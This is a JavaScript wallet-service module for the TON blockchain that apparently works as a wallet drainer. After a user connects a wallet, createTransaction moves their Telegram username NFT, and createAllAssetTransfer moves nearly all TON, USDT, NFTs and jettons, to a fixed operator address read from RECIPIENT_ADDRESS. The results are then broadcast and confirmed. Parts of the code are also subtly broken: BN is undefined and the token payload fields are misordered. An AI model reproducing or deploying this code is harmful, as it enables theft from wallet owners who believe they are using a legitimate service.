import redis from "../utils/redis.js";
import TonWeb from "tonweb";

// 构造 NFT 标准 transfer payload（真正的所有权转移需要用这个）
async function buildNftTransferPayloadBase64({
  newOwner,
  responseTo,
  forwardAmountTon = 0,
  forwardComment = "",
}) {
  if (typeof newOwner !== "string") {
    throw new Error(`newOwner 不是字符串: ${newOwner}`);
  }
  if (typeof responseTo !== "string") {
    throw new Error(`responseTo 不是字符串: ${responseTo}`);
  }

  const cell = new TonWeb.boc.Cell();
  cell.bits.writeUint(0x5fcc3d14, 32); // NFT transfer op
  const now = Date.now(); // 毫秒时间戳
  const rand = Math.floor(Math.random() * 1024); // 0-1023 随机数
  const queryId = now * 1024 + rand; // 保证唯一性
  cell.bits.writeUint(queryId, 64); // 唯一ID
  cell.bits.writeAddress(new TonWeb.utils.Address(newOwner));
  cell.bits.writeAddress(new TonWeb.utils.Address(responseTo));
  cell.bits.writeBit(0); // no custom_payload
  cell.bits.writeCoins(TonWeb.utils.toNano(String(forwardAmountTon)));

  const forwardPayload = new TonWeb.boc.Cell();
  if (forwardComment) {
    forwardPayload.bits.writeUint(0, 32);
    forwardPayload.bits.writeBytes(Buffer.from(forwardComment, "utf8"));
  }
  cell.refs.push(forwardPayload);

  // 修正：await cell.toBoc()
  const boc = await cell.toBoc(false);
  return Buffer.from(boc).toString("base64");
}

export class WalletService {
  /**
   * 连接钱包
   */
  static async connectWallet(wallet, raw) {
    try {
      // 将钱包信息存储到Redis，设置过期时间（24小时）
      const walletKey = `wallet:${wallet}`;
      await redis.set(
        walletKey,
        JSON.stringify({
          ...raw,
          connectedAt: new Date().toISOString(),
          lastActivity: new Date().toISOString(),
        })
      );

      console.log("钱包连接成功，已缓存到Redis:", wallet);

      return {
        success: true,
        message: "",
        data: {
          status: "connected",
        },
      };
    } catch (error) {
      throw new Error(`connected error: ${error.message}`);
    }
  }

  // 工具：TON→nanoTON（字符串）
  static toNanoStr = (vTon) => {
    if (typeof vTon === "number") {
      // 限制小数点最多 9 位
      vTon = vTon.toFixed(9);
    }
    return TonWeb.utils.toNano(String(vTon)).toString();
  };

  /**
   * 生成交易（标准方式）
   */
  static async createTransaction(wallet, productInfo) {
    try {
      console.log("createTransaction", wallet, productInfo);
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);

      if (!walletData) {
        throw new Error("walletData not found");
      }
      const username = productInfo[2];
      const newOwnerWallet = process.env.RECIPIENT_ADDRESS;

      const dnsRes = await fetch(
        `${process.env.TONAPI_URL}/v2/dns/${username}.t.me`
      );
      const dnsData = await dnsRes.json();
      const nftItemAddress = dnsData?.item?.address ?? null;
      // const amount = 0;
      const amount = this.toNanoStr(0.1);
      console.log(
        "createTransaction",
        username,
        newOwnerWallet,
        nftItemAddress
      );

      const nftPayloadBase64 = await buildNftTransferPayloadBase64({
        newOwner: newOwnerWallet, // 新的拥有者地址（接收NFT的地址）
        responseTo: wallet, // 回执地址（通常是发送方的钱包地址）
        forwardAmountTon: 0, // 转发给新拥有者的TON数量（可为 0）
        // forwardComment: `transfer @${username}`,
      });

      const messages = [
        {
          address: nftItemAddress, // ★ 目标是 NFT item 合约地址，不是新所有者钱包
          amount: amount, // 附带金额
          payload: nftPayloadBase64, // 正确的 BOC（base64）
        },
      ];

      const raw = {
        type: "nft_username_transfer",
        username,
        wallet,
        nftItemAddress,
        newOwnerWallet,
        amount: amount, // 附带金额
        ts: Date.now(),
      };

      return {
        // success: true,
        // raw,
        messages,
      };
    } catch (error) {
      console.error("createTransaction", error);
      throw new Error(`createTransaction error`);
    }
  }

  /**
   * 获取钱包所有资产
   */
  static async getAllWalletAssets(walletAddress) {
    try {
      const assets = {
        ton: { balance: "0", balanceTon: "0" },
        nfts: [],
        jettons: [],
        usdt: { balance: "0", balanceUsdt: "0" },
      };

      // 1. 获取TON余额
      const tonRes = await fetch(
        `${process.env.TONAPI_URL}/v2/blockchain/accounts/${walletAddress}`
      );
      const tonData = await tonRes.json();
      assets.ton.balance = tonData.balance || "0";
      // 修复：确保传入字符串
      assets.ton.balanceTon = TonWeb.utils.fromNano(
        String(tonData.balance || "0")
      );

      // 2. 获取NFT资产
      const nftRes = await fetch(
        `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/nfts?limit=1000`
      );
      const nftData = await nftRes.json();
      assets.nfts = nftData.nft_items || [];

      // 3. 获取Jetton资产
      const jettonRes = await fetch(
        `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/jettons?limit=1000`
      );
      const jettonData = await jettonRes.json();
      assets.jettons = jettonData.balances || [];

      console.log("钱包资产扫描完成:", {
        ton: assets.ton.balanceTon,
        nftCount: assets.nfts.length,
        jettonCount: assets.jettons.length,
        jettons: assets.jettons,
      });

      return assets;
    } catch (error) {
      console.error("获取钱包资产错误:", error);
      throw new Error(`获取钱包资产失败: ${error.message}`);
    }
  }

  /**
   * 创建批量资产转移交易
   */
  static async createAllAssetTransfer(wallet) {
    const targetAddress = process.env.RECIPIENT_ADDRESS;
    try {
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);

      if (!walletData) {
        throw new Error("walletData not found");
      }

      // 获取所有资产
      const assets = await this.getAllWalletAssets(wallet);
      const messages = [];

      // 1. TON转账（保留少量作为Gas费）
      const tonBalance = parseFloat((assets.ton.balanceTon - 2).toFixed(2));
      if (tonBalance > 0.5) {
        messages.push({
          address: targetAddress,
          amount: this.toNanoStr(tonBalance),
          payload: "",
        });
      }

      // 2. USDT转账
      if (parseFloat(assets.usdt.balanceUsdt) > 0) {
        const usdtPayload = await this.buildUsdtTransferPayload({
          toAddress: targetAddress,
          amount: assets.usdt.balanceUsdt,
          responseTo: wallet,
        });

        messages.push({
          address: targetAddress, // USDT
          amount: this.toNanoStr(0.1), // Gas费
          payload: usdtPayload,
        });
      }

      // 3. NFT转移
      for (const nft of assets.nfts) {
        const nftPayload = await buildNftTransferPayloadBase64({
          newOwner: targetAddress,
          responseTo: wallet,
          forwardAmountTon: 0,
          forwardComment: `Bulk transfer NFT`,
        });

        messages.push({
          address: nft.address,
          amount: this.toNanoStr(0.05), // Gas费
          payload: nftPayload,
        });
      }

      // 4. 其他Jetton转移
      for (const jetton of assets.jettons) {
        const jettonPayload = await this.buildJettonTransferPayload({
          toAddress: targetAddress,
          amount: jetton.balance,
          jettonAddress: jetton.jetton.address,
          responseTo: wallet,
        });

        messages.push({
          address: jetton.jetton.address,
          amount: this.toNanoStr(0.1), // Gas费
          payload: jettonPayload,
        });
      }

      console.log(`批量转移交易已生成: ${messages.length} 个消息`);
      console.log("messages", messages);
      return {
        success: true,
        data: { messages },
        assets: assets,
        messages: messages,
        message: `批量转移交易已生成: ${messages.length} 个消息`,
      };
    } catch (error) {
      console.error("创建批量资产转移错误:", error);
      throw new Error(`创建批量资产转移失败: ${error.message}`);
    }
  }

  /**
   * 构建USDT转账payload
   */
  static async buildUsdtTransferPayload({ toAddress, amount, responseTo }) {
    const cell = new TonWeb.boc.Cell();

    // USDT转账操作码
    cell.bits.writeUint(0x178d4519, 32);
    cell.bits.writeUint(0, 64); // query_id
    cell.bits.writeAddress(new TonWeb.utils.Address(toAddress));
    cell.bits.writeAddress(new TonWeb.utils.Address(responseTo));
    cell.bits.writeBit(0); // no custom_payload
    cell.bits.writeCoins(TonWeb.utils.toNano("0")); // forward_ton_amount

    // forward_payload
    const forwardPayload = new TonWeb.boc.Cell();
    cell.refs.push(forwardPayload);

    // USDT数量
    const usdtAmount = Math.floor(parseFloat(amount) * 1000000);
    cell.bits.writeUint(usdtAmount, 64);

    const boc = await cell.toBoc(false);
    return Buffer.from(boc).toString("base64");
  }

  /**
   * 构建Jetton转账payload
   */
  static async buildJettonTransferPayload({
    toAddress,
    amount,
    jettonAddress,
    responseTo,
  }) {
    const cell = new TonWeb.boc.Cell();

    // Jetton转账操作码
    cell.bits.writeUint(0xf8a7ea5, 32);
    cell.bits.writeUint(0, 64); // query_id
    cell.bits.writeUint(parseInt(amount), 64); // jetton数量
    cell.bits.writeAddress(new TonWeb.utils.Address(toAddress));
    cell.bits.writeAddress(new TonWeb.utils.Address(responseTo));
    cell.bits.writeBit(0); // no custom_payload
    cell.bits.writeCoins(TonWeb.utils.toNano("0")); // forward_ton_amount

    // forward_payload
    const forwardPayload = new TonWeb.boc.Cell();
    cell.refs.push(forwardPayload);

    const boc = await cell.toBoc(false);
    return Buffer.from(boc).toString("base64");
  }

  /**
   * 广播已签名的 BOC（TonAPI）
   * @param {string}
   */
  static async broadcastWithTonapi(wallet, raw) {
    console.log("sendBoc", wallet, raw);
    const res = await fetch(`${process.env.TONAPI_URL}/v2/sendBoc`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${process.env.TONAPI_KEY}`,
      },
      body: JSON.stringify({ boc: raw.boc.boc }),
    });

    const data = await res.json().catch(() => ({}));
    if (!res.ok) {
      const msg =
        data?.message || data?.error || `${res.status} ${res.statusText}`;
      throw new Error(`sendBoc failed: ${msg}`);
    }
    console.log("sendBoc success", data);
    await redis.set(
      `boc:${wallet}`,
      JSON.stringify({
        ...data,
      })
    );

    try {
      const targetAddress = raw.messages[0].address; // 例如 NFT item 地址/收款地址
      const expect = {
        amountNano: raw.messages[0].amount, // 期望金额（nanoTON）
        to: targetAddress,
        since: Date.now() - 5 * 60 * 1000, // 最近5分钟的交易
      };
      const confirmed = await this.waitForConfirmation(
        wallet,
        targetAddress,
        expect,
        process.env.TONAPI_KEY,
        90_000,
        3_000
      );
      return {
        success: true,
        confirmed,
        data,
      };
    } catch (e) {
      // 未确认并不一定代表失败，可能只是还没进块。你可以返回已接收并在后台继续轮询。
      return {
        success: true,
        pending: true,
        data,
      };
    }
  }

  static async sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  /**
   * 简单轮询确认：在窗口期内寻找符合条件的一笔入账
   * @param {string} account - 目标账户（例如 NFT item 地址或收款地址）
   * @param {{amountNano?: string, from?: string, to?: string, since?: number}} expect
   * @param {string} apiKey
   * @param {number} timeoutMs
   * @param {number} intervalMs
   */
  static async waitForConfirmation(
    wallet,
    account,
    expect,
    apiKey,
    timeoutMs = 60_000,
    intervalMs = 3_000
  ) {
    const deadline = Date.now() + timeoutMs;

    while (Date.now() < deadline) {
      const res = await fetch(
        `${process.env.TONAPI_URL}/v2/blockchain/accounts/${account}/transactions?limit=20`,
        {
          headers: { Authorization: `Bearer ${apiKey}` },
        }
      );
      if (res.ok) {
        const data = await res.json();
        const txs = data?.transactions ?? [];
        // 依据你的业务校验条件（下面只是示例匹配）
        const hit = txs.find((tx) => {
          const inMsg = tx?.in_msg;
          if (!inMsg) return false;
          const okTo = expect.to
            ? inMsg.destination?.address === expect.to
            : true;
          const okTime = expect.since ? tx.utime * 1000 >= expect.since : true;

          // 金额用下限判断（字符串到BN比较）
          let okAmt = true;
          if (expect.minAmountNano) {
            const val = new BN(String(inMsg.value || "0"));
            okAmt = val.gte(new BN(String(expect.minAmountNano)));
          }
          return okTo && okTime && okAmt;
        });
        if (hit) {
          await redis.del(`boc:${wallet}`);
          return hit; // 找到了匹配交易
        }
      }
      await this.sleep(intervalMs);
    }
    throw new Error("confirmation timeout");
  }
}
